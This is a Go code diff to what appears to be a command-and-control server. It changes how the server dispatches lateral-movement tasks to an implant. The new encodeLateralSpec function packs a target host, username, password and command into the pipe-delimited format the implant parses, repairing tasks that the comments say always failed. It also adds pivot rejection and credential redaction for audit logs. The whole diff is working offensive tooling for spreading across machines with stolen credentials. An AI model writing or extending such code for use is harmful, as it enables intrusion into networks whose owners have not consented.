@@ -153,23 +153,72 @@ type lateralSpec struct {
 
 // lateralAuditSummary renders a redacted summary of a lateral-movement spec
 // for logs and the tamper-evident audit chain. Credential material
-// (password/hash/credential/key_path/pivot) is never written to either sink;
-// unparsable specs degrade to a byte count.
+// (password/hash/credential/key_path/pivot) is never written to either sink.
+//
+// It accepts either wire format: the pipe form the implant parses
+// ("type|target|user|pass|cmd") and a JSON object (the API form). Only the
+// leading identifying fields are echoed; the password slot and the command are
+// always dropped.
 func lateralAuditSummary(spec string) string {
 	if strings.TrimSpace(spec) == "" {
 		return "lateral movement"
 	}
-	var m map[string]interface{}
-	if err := json.Unmarshal([]byte(spec), &m); err != nil {
-		return fmt.Sprintf("lateral movement (spec %d bytes)", len(spec))
+	trimmed := strings.TrimSpace(spec)
+	var method, target, user string
+	if strings.HasPrefix(trimmed, "{") {
+		var m map[string]interface{}
+		if err := json.Unmarshal([]byte(trimmed), &m); err == nil {
+			method, _ = m["method"].(string)
+			target, _ = m["target"].(string)
+			user, _ = m["username"].(string)
+		} else {
+			return fmt.Sprintf("lateral movement (spec %d bytes)", len(spec))
+		}
+	} else {
+		parts := strings.SplitN(trimmed, "|", 5)
+		if len(parts) < 3 {
+			return fmt.Sprintf("lateral movement (spec %d bytes)", len(spec))
+		}
+		method, target, user = parts[0], parts[1], parts[2]
+		// parts[3] is the password and parts[4] the command; both stay out.
 	}
-	method, _ := m["method"].(string)
-	target, _ := m["target"].(string)
-	user, _ := m["username"].(string)
+	method = strings.ToLower(strings.TrimSpace(method))
+	target = strings.TrimSpace(target)
+	user = strings.TrimSpace(user)
 	if method == "" {
 		method = "unknown"
 	}
 	return fmt.Sprintf("lateral movement: method=%s target=%s username=%s", method, target, user)
+}
+
+// encodeLateralSpec renders the wire format the implant parses:
+// "type|target|user|pass|cmd" (internal/payload/agent/agent_windows.go,
+// lateralMove). It was previously sent as JSON, which the agent could never
+// parse — strings.SplitN on "|" yields one part, so every lateral task failed
+// with "format: type|target|user|pass|cmd".
+//
+// The implant splits with SplitN(..., 5), so the command may safely contain
+// pipes; the fields before it may not, or they would shift the parse.
+func encodeLateralSpec(req lateralSpec) (string, error) {
+	for name, v := range map[string]string{
+		"method": req.Method, "target": req.Target,
+		"username": req.Username, "password": req.Password,
+	} {
+		if strings.Contains(v, "|") {
+			return "", fmt.Errorf("%s must not contain '|'", name)
+		}
+	}
+	cmd := strings.TrimSpace(req.Command)
+	if cmd == "" {
+		cmd = "whoami" // matches the implant's own default
+	}
+	return strings.Join([]string{
+		strings.ToLower(strings.TrimSpace(req.Method)),
+		strings.TrimSpace(req.Target),
+		strings.TrimSpace(req.Username),
+		req.Password,
+		cmd,
+	}, "|"), nil
 }
 
 // handleAPILateralExecute dispatches a lateral movement task via JSON API
@@ -186,18 +235,24 @@ func (s *Server) handleAPILateralExecute(c *gin.Context) {
 		respondError(c, http.StatusBadRequest, "source, target and method required")
 		return
 	}
-	spec, err := json.Marshal(req)
-	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to encode spec")
+	// The implant has no pivot slot, so accepting one would let the operator
+	// believe traffic is tunnelled through an agent they chose when it is not.
+	if strings.TrimSpace(req.Pivot) != "" {
+		respondError(c, http.StatusBadRequest, "pivot is not supported by the implant")
 		return
 	}
-	task, err := s.createTask(req.Source, "lateral", string(spec), "", "", "", 0, 0)
+	spec, err := encodeLateralSpec(req)
+	if err != nil {
+		respondError(c, http.StatusBadRequest, err.Error())
+		return
+	}
+	task, err := s.createTask(req.Source, "lateral", spec, "", "", "", 0, 0)
 	if err != nil {
 		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Lateral movement via JSON API", "agent_id", req.Source, "target", req.Target, "method", req.Method)
-	s.LogAuditRecord(c, "lateral", "agent", req.Source, lateralAuditSummary(string(spec)), true, nil)
+	s.LogAuditRecord(c, "lateral", "agent", req.Source, lateralAuditSummary(spec), true, nil)
 	s.broadcastTaskUpdate(req.Source, *task)
 	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
 }
